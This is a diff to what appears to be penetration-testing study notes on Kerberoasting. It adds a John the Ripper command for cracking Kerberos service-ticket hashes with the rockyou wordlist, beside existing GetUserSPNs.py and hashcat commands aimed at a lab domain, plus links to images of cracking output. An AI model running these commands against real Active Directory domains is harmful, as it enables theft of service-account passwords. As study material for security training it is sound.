@@ -25,5 +25,22 @@ $ sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.0.149  -requ
 $ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O
 
 # cracking with johntheripper
-
+$ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --fork=4
 ```
+
+
+#### **Example**
+
+**_Hashcat Output :_**
+
+
+
+![](https://i.imgur.com/KkPwija.jpg)
+
+
+
+**_Johntheripper Output :_**
+
+
+
+![](https://i.imgur.com/4tLo5Jj.png)
